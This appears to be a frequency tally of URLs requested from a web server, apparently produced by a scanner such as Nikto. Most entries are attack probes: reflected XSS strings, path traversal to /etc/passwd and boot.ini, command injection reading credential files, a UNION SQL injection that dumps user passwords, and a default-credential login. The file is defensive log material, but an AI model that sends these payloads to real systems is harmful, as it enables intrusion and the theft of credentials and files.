Frequency,Resource
1,/blah-whatever-badfile.jsp
1,/tiki/
1,/TvLBvkHh.chl+
1,/TvLBvkHh.iso2022-kr
1,/typo3conf/localconf.php
1,viewcvs.cgi/viewcvs/?cvsroot=<script>alert('Vulnerable')</script>
1,/cgi-bin/shop/orders/orders.txt
1,post-query
1,/ticket.php?id=99999
1,/TvLBvkHh.wwwacl
1,/lists/admin/
1,/search/htx/SQLQHit.asp
1,shtml.dll
1,/TvLBvkHh.stat
1,/a.jsp/%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,/WebAdmin.dll?View=Logon
1,/TvLBvkHh.dat
1,/search?NS-query-pat=..\..\..\..\..\..\..\..\..\..\boot.ini
1,query
1,/inc/dbase.php
1,/mailman/options/yourlist?language=en&email=&lt;SCRIPT&gt;alert('Vulnerable')&lt;/SCRIPT&gt;
1,/cgi-bin/orders/orders.txt
1,"/phpwebsite/index.php?module=pagemaster&PAGE_user_op=view_page&PAGE_id=10\""><script>alert('Vulnerable')</script>&MMN_position=[X:X]"
1,/../../../../../../../../../../etc/passwd
1,/cgi-bin/guestbook/passwd
1,/cfdocs/expeval/openfile.cfm
1,ezshopper/loadpage.cgi?user_id=1&file=|cat%20/etc/passwd|
1,/TvLBvkHh.SMAIL893
1,/forums/index.php?board=;action=login2&user=USERNAME&cookielength=120&passwrd=PASSWORD<script>alert('Vulnerable')</script>
1,/SiteServer/Admin/knowledge/dsmgr/users/UserManager.asp
1,/cfdocs/cfmlsyntaxcheck.cfm
1,/cgi-bin/awstats/awstats.pl
1,/.../.../.../.../.../.../.../.../.../boot.ini
1,/rtm.log
1,/weblogic
1,/cgi-bin/vq/demos/respond.pl?<script>alert('Vulnerable')</script>
1,/bb000001.pl%3Cscript%3Ealert('Vulnerable')%3C/script%3E
1,/database/db2000.mdb
1,"/_mem_bin/formslogin.asp?\""><script>alert('Vulnerable')</script>"
5,/./
1,"FormMail.cgi?<script>alert(\""Vulnerable\"");</script>"
1,"/phpwebsite/index.php?module=fatcat&fatcat[user]=viewCategory&fatcat_id=1%00+\""><script>alert('Vulnerable')</script>"
1,post32.exe%7Cdir%20c:%5C%5C
1,/junk.aspx
1,sscd_suncourier.pl
1,/TvLBvkHh.sql
1,mt/mt-check.cgi
1,/SiteServer/Admin/knowledge/dsmgr/default.asp
1,/modules/Submit/index.php?op=pre&title=<script>alert(document.cookie);</script>
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.jsp
2,/phpma/index.php
1,story.pl?next=../../../../../../../../../../etc/passwd%00
1,myguestbook.cgi?action=view
1,/current/index.php?site=demos&bn=../../../../../../../../../../etc/passwd%00
1,/nsn/..%5Cutil/glist.bas
2,pbcgi.cgi?name=Joe%Camel&email=%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3B%3C%2FSCRIPT%3E
1,/TvLBvkHh.xls
2,/admin/phpmyadmin/index.php
1,/horde/test.php?mode=phpinfo
2,/typo3/phpmyadmin/index.php
1,/upd/
1,/cgi-bin/mrtg.cgi?cfg=blah
1,"/postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*"
1,photo/protected/manage.cgi
1,"/emailfriend/emailfaq.php?id=\""<script>alert(document.cookie)</script>"
1,aglimpse.cgi
1,/examples/jsp/source.jsp??
1,FormHandler.cgi?realNikto=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com
1,/SiteServer/Admin/commerce/foundation/driver.asp
1,mailit.pl
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.stm
1,dcshop/auth_data/auth_user_file.txt
1,/cgi-shl/win-c-sample.exe
3,/ccvv
1,/cgi-bin/smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|
1,webgais
1,horde/test.php?mode=phpinfo
2,/cgi-bin/formmail.pl
1,/download.php?sortby=&dcategory=<script>alert('Vulnerable')</script>
2,/article.cfm?id=1'<script>alert(document.cookie);</script>
1,/junk988.aspx%5C
1,mail/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,sojourn.cgi?cat=../../../../../../../../../../etc/password%00
1,plusmail
1,/modules.php?op=modload&name=FAQ&file=index&myfaq=yes&id_cat=1&categories=%3Cimg%20src=javascript:alert(9456);%3E&parent_id=0
2,/cgi-bin/wrap
1,perl.exe
1,webplus?script=../../../../../../../../../../etc/passwd
1,/a?<script>alert('Vulnerable')</script>
1,/cgi-bin/shop/auth_data/auth_user_file.txt
1,/WEB-INF/web.xml
1,/phpimageview.php?pic=javascript:alert(8754)
1,download.cgi
1,/TvLBvkHh.koi8-r
1,probecontrol.cgi?command=enable&username=cancer&password=killer
2,/cgi-bin/pbcgi.cgi?name=Joe%Camel&email=%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3B%3C%2FSCRIPT%3E
1,/ssdefs/
1,auktion.cgi?menue=../../../../../../../../../../etc/passwd
1,/TvLBvkHh.el
1,cgicso?query=<script>alert('Vulnerable')</script>
1,/cgi-bin/af.cgi?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd
1,"/cgi-bin/alibaba.pl%7Cdir%20..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C,"
1,/phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
1,/cgi-bin/14all-1.1.cgi?cfg=../../../../../../../../etc/passwd
1,whois/whois.cgi?lookup=;&ext=/bin/cat%20/etc/passwd
1,/scripts/httpodbc.dll
2,/cgi-bin/wwwwais
1,/modules.php?op=modload&name=WebChat&file=index&roomid=<script>alert('Vulnerable')</script>
1,/cgi-perl/
1,/TvLBvkHh.show
1,/admin-serv/tasks/configuration/ViewLog?file=passwd&num=5000&str=&directories=admin-serv%2Flogs%2f..%2f..%2f..%2f..%2f..%2f..%2fetc&id=admin-serv
1,/cgi-bin/diagnose.cgi
1,/TopSitesdirectory/help.php?sid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,/TvLBvkHh.java
1,/modules.php?name=Your_Account&op=userinfo&uname=<script>alert('Vulnerable')</script>
1,/cgi-bin/classifieds/index.cgi
2,/cgi-bin/cgiwrap/~sys
1,/cgi-bin/Album?mode=album&album=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc&dispsize=640&start=0
4,/index.php
1,/cgi-bin/gH.cgi
1,/cgi-bin/opendir.php?/etc/passwd
1,/SiteServer/admin/findvserver.asp
1,"/forumdisplay.php?GLOBALS[]=1&f=2&comma=\"".system('id').\"""
1,calendar_admin.pl?config=|cat%20/etc/passwd|
1,fpsrvadm.exe
1,/PMA/index.php
1,nph-emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/cgi-bin/fpsrvadm.exe
1,"/msadm/user/login.php3?account_name=\""><script>alert('Vulnerable')</script>"
1,/polycomftp/
1,/cgi-bin/retrieve_password.pl
1,handler.cgi
2,cgiwrap/~nuucp
1,perl
1,snorkerz.bat
1,nph-showlogs.pl?files=../../&filter=.*&submit=Go&linecnt=500&refresh=0
1,/sunshop.index.php?action=storenew&username=<script>alert('Vulnerable')</script>
1,/cgi-bin/bigconf.cgi
1,/sipphones/
1,/pages/htmlos/%3Cscript%3Ealert('Vulnerable');%3C/script%3E
1,/cgi-bin/bigconf.cgi?command=view_textfile&file=/etc/passwd&filters=
2,/MyAdmin/scripts/setup.php
1,admin/admin.cgi
1,/cfdocs/examples/parks/detail.cfm
1,/geeklog/users.php
1,/cgi-bin/flexform
1,dumpenv.pl
1,mkplog.exe
2,/cgi-bin/cgiwrap/~unknown
1,snorkerz.cmd
1,YaBB/YaBB.cgi?board=BOARD&action=display&num=<script>alert('Vulnerable')</script>
1,test-cgi.exe?<script>alert(document.cookie)</script>
2,cgiwrap/~nobody
1,"/ca000001.pl?ACTION=SHOWCART&hop=\""><script>alert('Vulnerable')</script>&PATH=acatalog%2f"
2,/_mem_bin/auoconfig.asp
1,/cgi-home/
1,/phpMyAdmin/index.php
1,/cgi-bin/mt/mt-check.cgi
1,/TvLBvkHh.CGI
1,cgiwrap/~ZA3Z1
1,"/msadm/domain/index.php3?account_name=\""><script>alert('Vulnerable')</script>"
1,/exchange/lib/PAGEUTIL.INC
1,/phptonuke.php?filnavn=<script>alert('Vulnerable')</script>
1,/TvLBvkHh.shtm
1,guestbook.cgi
1,ibill.pm
1,cmd.exe?/c+dir
1,/TvLBvkHh.cellsprint
1,/cgi-bin/dumpenv.pl
1,/cgi-bin/htsearch?exclude=%60/etc/passwd%60
2,/index
1,/TvLBvkHh.net
1,/exchange/lib/DELETE.INC
1,/TvLBvkHh.back
1,/file-that-is-not-real-2002.php3
2,cgiwrap/~test
1,/examples/cookie
1,/cgi-bin/testing_whatever
1,"/soinfo.php?\""><script>alert('Vulnerable')</script>"
1,/scripts/repost.asp
1,/cgi-bin/hello.bat?&dir+c:\\
1,SGB_DIR/superguestconfig
1,/exchange/lib/SESSION.INC
1,/themes/mambosimple.php?detection=detected&sitename=</title><script>alert(document.cookie)</script>
1,/mitel/
5,/hp/device/this.LCDispatcher
1,/phpinfo.php?VARIABLE=<script>alert('Vulnerable')</script>
1,/aMiWjJNIot
1,/TvLBvkHh.mdb
1,/index.php?top_message=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
1,/&lt;script&gt;alert('Vulnerable');&lt;/script&gt;
1,/iissamples/issamples/SQLQHit.asp
2,/myphpnuke/links.php?op=MostPopular&ratenum=[script]alert(document.cookie);[/script]&ratetype=percent
1,/index.php/123
1,/cgi-bin/csGuestBook.cgi?command=savesetup&setup=;system('cat%20/etc/passwd')
1,/ews/ews/architext_query.pl
1,/nph-showlogs.pl?files=../../../../../../../../etc/passwd&filter=.*&submit=Go&linecnt=500&refresh=0
1,/tftpboot/backup/
1,/TvLBvkHh.ASP
1,scoadminreg.cgi
1,smartsearch/smartsearch.cgi?keywords=|/bin/cat%20/etc/passwd|
1,/comments.php?subject=<script>alert('Vulnerable')</script>&comment=<script>alert('Vulnerable')</script>&pid=0&sid=0&mode=&order=&thold=op=Preview
1,/index.jsp%00x
1,/pma-old/index.php
1,/cgi-bin/urlcount.cgi?%3CIMG%20SRC%3D%22%22%20ONERROR%3D%22alert%28%27Vulnerable%27%29%22%3E
1,/webcgi/
1,/?mod=some_thing&op=browse
1,/iissamples/issamples/sqlqhit.asp
1,/cgi-bin/alienform.cgi?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd
2,cgiwrap/~operator
1,/cgi-bin/testcgi.exe
1,/SiteServer/Admin/knowledge/persmbr/vs.asp
1,/SPA942/
1,/readme.eml
1,/?mod=<script>alert(document.cookie)</script>&op=browse
1,/vgn/jsp/previewer
1,/cgi-bin/search.php?searchstring=<script>alert(document.cookie)</script>
1,/TvLBvkHh.bat%7Cdir
1,/tsweb/
1,/cgi-bin/cmd.exe?/c+dir
1,date
1,technote/main.cgi?board=FREE_BOARD&command=down_load&filename=/../../../../../../../../../../etc/passwd
1,/cgi-bin/photo/protected/manage.cgi
1,/cgi-bin/fortune
1,/exchange/lib/JSUTIL.INC
2,/cgi-bin/cgiwrap/~sshd
2,/tools/phpMyAdmin/index.php
1,/cgi-bin/search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini
1,blog/mt-load.cgi
1,/cgi-bin/uptime
1,/forums/modules/vwar/admin/config.php
1,/TvLBvkHh.LOG
1,/cgi-bin/htsearch?config=foofighter&restrict=&exclude=&method=and&format=builtin-long&sort=score&words=
1,dcshop/orders/orders.txt
1,/local/httpd$map.conf
2,/cgi-bin/cgiwrap/~www
1,retrieve_password.pl
1,/webcart-lite/orders/import.txt
1,/vider.php3
1,flexform
1,/xps/
1,/?Open
1,/TvLBvkHh.genpopuplist
1,echo.bat
1,/cgi-bin/directorypro.cgi?want=showcat&show=../../../../../../../../../../etc/passwd%00
1,/pmamy/index.php
1,/examples/session
1,///etc/hosts
1,/cgi-bin/compatible.cgi
1,/modules.php?name=Stories_Archive&sa=show_month&year=2002&month=03&month_l=<script>alert('Vulnerable')</script>
1,/3rdparty/phpmyadmin/db_details_importdocsql.php?submit_show=true&do=import&docpath=../
8,/phpMyAdmin/scripts/setup.php
1,ans.pl?p=../../../../../usr/bin/id|&blah
1,/cgi-bin/title.cgi
1,/%3C/title%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E
1,/cgi-bin/bb-hist.sh?HISTFILE=../../../../../../../../../../etc/passwd
1,/%3Cscript%3Ealert('Vulnerable')%3C/script%3E.aspx
1,mail
1,/TvLBvkHh.sys
1,foxweb.dll
1,/index.asp%5C
2,/cgi-bin/horde/test.php
1,fom/fom.cgi?cmd=<script>alert('Vulnerable')</script>&file=1&keywords=vulnerable
1,/TvLBvkHh.AP
1,/cgi-bin/perl.exe?-v
1,/nsn/..%5Cutil/attrib.bas
1,/usercp.php?function=avataroptions:javascript:alert(%27Vulnerable%27)
1,/cgi-bin/query?mss=%2e%2e/config
1,/cgi-bin/search/search.cgi?keys=*&prc=any&catigory=../../../../../../../../../../../../etc
1,/goform/CheckLogin?login=root&password=tslinux
1,lwgate.cgi
1,/cgi-bin/input2.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,/index.shtml
1,/error/HTTP_NOT_FOUND.html.var
1,/TvLBvkHh.backup
1,"/chat/register.php?register=yes&username=OverG&email=<script>alert%20(\""Vulnerable\"")</script>&email1=<script>alert%20(\""Vulnerable\"")</script>"
1,"/cgi-bin/viewcvs.cgi/viewcvs/viewcvs/?sortby=rev\""><script>alert('Vulnerable')</script>;"
1,alienform.cgi?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd
1,/?OpenServer
1,/MIDICART/midicart.mdb
1,/phonecfg.cfg
1,/?sql_debug=1
2,wwwwais
1,/scripts/cpshost.dll
1,/TvLBvkHh.pl%7Cdir
1,/TvLBvkHh.10:100
3,//pma/scripts/setup.php
1,/TvLBvkHh.signature
1,/Mem/dynaform/FileExplorer.htm
1,/pmamy2/index.php
1,/nsn/..%5Cutil/rd.bas
1,mrtg.cgi?cfg=blah
1,test.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
1,/cfdocs/examples/cvbeans/beaninfo.cfm
1,/cgi-bin/test-cgi.exe?<script>alert(document.cookie)</script>
1,/cgi-bin/hpnst.exe?c=p+i=SrvSystemInfo.html
1,/vchat/msg.txt
1,/cfcache.map
1,wrap
2,cgiwrap/~web
1,/addyoursite.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;
1,com5.pl
1,/us/cgi-bin/sewse.exe?d:/internet/sites/us/sewse/jabber/comment2.jse+c:\boot.ini
1,/guestbook/pwd
1,/TvLBvkHh.ml
1,/bigconf.cgi
1,/cgi-bin/newsdesk.cgi?t=../../../../../../../../../../etc/passwd
1,/index.pl
1,cgitest.exe
1,"/upload.php?type=\""<script>alert(document.cookie)</script>"
1,/cgi-bin/wwwadmin.pl
1,/webcart-lite/config/import.txt
1,/cgi-bin/test2.pl?&lt;script&gt;alert('Vulnerable');&lt;/script&gt;
1,/cgi-bin/classified.cgi
1,/cgi-bin/common/listrec.pl
1,/submit.php?subject=<script>alert('Vulnerable')</script>&story=<script>alert('Vulnerable')</script>&storyext=<script>alert('Vulnerable')</script>&op=Preview
1,/oc/Search/sqlqhit.asp
1,htmlscript?../../../../../../../../../../etc/passwd
1,/mambo/index.php?Itemid=7JxZx
1,/domlog.nsf
1,/chat/!nicks.txt
1,/atomicboard/index.php?location=../../../../../../../../../../etc/passwd
1,/gxp2120/
1,/exchange/root.asp?acs=anon
1,"/administrator/gallery/uploadimage.php?directory=\""<script>alert(document.cookie)</script>"
1,/cgi-bin/ezboard.cgi
1,/isapi/testisa.dll?check1=<script>alert(document.cookie)</script>
1,/TvLBvkHh.dbm
1,info2www
1,/TvLBvkHh.dbc
1,"/administrator/gallery/view.php?path=\""<script>alert(document.cookie)</script>"
1,/IDSWebApp/IDSjsp/Login.jsp
1,/jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../../../../boot.ini
1,/exchange/lib/RENDER.INC
5,/phpMyAdmin/_scripts/setup.php
1,view-source
1,/phpmyadmin/index.php
1,/examples/servlets/index.html
1,"/vgn/login/1,501,,00.html?cookieName=x--\>"
1,/index.php3
2,/cgi-bin/cgiwrap/~ftp
1,/exchange/lib/JSATTACH.INC
1,/scripts/tools/dsnform
1,/forums/browse.php?fid=3&tid=46&go=<script>JavaScript:alert('Vulnerable');</script>
1,/TvLBvkHh.x-shop
1,/tvcs/getservers.exe?action=selects1
1,auth_data/auth_user_file.txt
1,"/msadm/site/index.php3?authid=\""><script>alert('Vulnerable')</script>"
1,cal_make.pl?p0=../../../../../../../../../../etc/passwd%00
1,/TvLBvkHh.inc
1,common.php?f=0&ForumLang=../../../../../../../../../../etc/passwd
1,htsearch?config=foofighter&restrict=&exclude=&method=and&format=builtin-long&sort=score&words=
3,//phpmyadmin/scripts/setup.php
1,*
1,/asp/SQLQHit.asp
1,/TvLBvkHh.ini
1,/page.cgi?../../../../../../../../../../etc/passwd
1,"/cgi-bin/tst.bat%7Cdir%20..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C,"
1,/TvLBvkHh.pdf
1,/servlet/ContentServer?pagename=<script>alert('Vulnerable')</script>
1,/scgi-bin/
5,/phpMyAdmin1/scripts/setup.php
1,webplus?about
1,/cgi-bin/anacondaclip.pl?template=../../../../../../../../../../etc/passwd
1,/inc/common.load.php
1,/cgi-bin/mail
1,/oc/Search/SQLQHit.asp
1,/cgi-bin/query
1,/cgi-bin/shopper.cgi?newpage=../../../../../../../../../../etc/passwd
2,cgiwrap/~www
1,/TvLBvkHh.pl
1,/TvLBvkHh.pm
1,mt-static/mt-load.cgi
1,zml.cgi?file=../../../../../../../../../../etc/passwd%00
5,/admin/scripts/setup.php
1,/cgi-bin/infosrch.cgi
1,/TvLBvkHh.zip
1,/TvLBvkHh.pw
1,"login.pl?course_id=\"">&lt;SCRIPT&gt;alert('Vulnerable')&lt;/SCRIPT&gt;"
1,sbcgi/sitebuilder.cgi
1,/TvLBvkHh.xml
1,/TvLBvkHh.00RelNotes
5,/mysql/scripts/setup.php
1,/modules.php?op=modload&name=Sections&file=index&req=viewarticle&artid=
1,/vgn/ac/index
1,dbman/db.cgi?db=no-db
1,/nsn/..%5Cutil/send.bas
1,/cgi-bin/perl
1,store/agora.cgi?page=whatever33.html
1,/TvLBvkHh.xtp
1,/servlets/SchedulerTransfer
1,/cgi-bin/.cobalt/alert/service.cgi?service=<script>alert('Vulnerable')</script>
1,/a_security.htm
2,/index.aspx
1,/TvLBvkHh
1,/vgn/errors
1,/ROADS/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd%00
1,/wp-includes/SimplePie/ogi.exe
1,/userinfo.php?uid=1;
2,/.well-known/security.txt
1,/examples/servlet/AUX
1,lastlines.cgi?process
1,/cgi-bin/DCShop/orders/orders.txt
1,/index.php?option=search&searchword=<script>alert(document.cookie);</script>
1,/cgi-bin/webplus?script=../../../../../../../../../../etc/passwd
2,/admin/phpMyAdmin/index.php
1,ss
1,/scripts/samples/details.idc
1,/%3F.jsp
1,/TvLBvkHh.config
1,/cgi-local/cgiemail-1.6/cgicso?query=<script>alert('Vulnerable')</script>
1,/cgi-bin/guestbook.cgi
1,/cgi-bin/index.js0x70
1,"/phpBB/viewtopic.php?t=17071&highlight=\"">\""<script>javascript:alert(document.cookie)</script>"
1,/_mem_bin/remind.asp
1,/provisioning/spa/
5,/dbadmin/scripts/setup.php
1,/showcat.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;
1,/chassis/config/GeneralChassisConfig.html
2,horde/test.php
5,MsmMask.exe?mask=/junk334
2,/cgi-bin/cgiwrap/~adm
1,/TvLBvkHh.bak
1,/TvLBvkHh.bat
1,/cgi-bin/zml.cgi?file=../../../../../../../../../../etc/passwd%00
1,webmail/html/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/TvLBvkHh.bas
1,/cgi-bin/db4web_c/dbdirname//etc/passwd
1,/TvLBvkHh.gif
1,/TvLBvkHh.UploadServlet
1,/adm/config.php
1,/help/
1,/nav/cList.php?root=</script><script>alert('Vulnerable')/<script>
1,/TvLBvkHh.tml
1,/supporter/index.php?t=updateticketlog&id=&lt;script&gt;<script>alert('Vulnerable')</script>&lt;/script&gt;
1,/guestbook/guestbookdat
1,/vgn/performance/TMT/Report/XML
1,bannereditor.cgi
1,/cgi-bin/mkplog.exe
1,/phpMyAdmin/phpMyAdmin/index.php
1,"athcgi.exe?command=showpage&script='],[0,0]];alert('Vulnerable');a=[['"
1,ws_ftp.ini
1,"/SiteServer/Knowledge/Default.asp?ctr=\""><script>alert('Vulnerable')</script>"
1,"alibaba.pl%7Cdir%20..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C,"
1,/TvLBvkHh.tmp
1,/shopping300.mdb
1,store/index.cgi?page=../../../../../../../../etc/passwd
1,/cgi-bin/viewcvs.cgi/viewcvs/?cvsroot=<script>alert('Vulnerable')</script>
1,/cbms/realinv.php
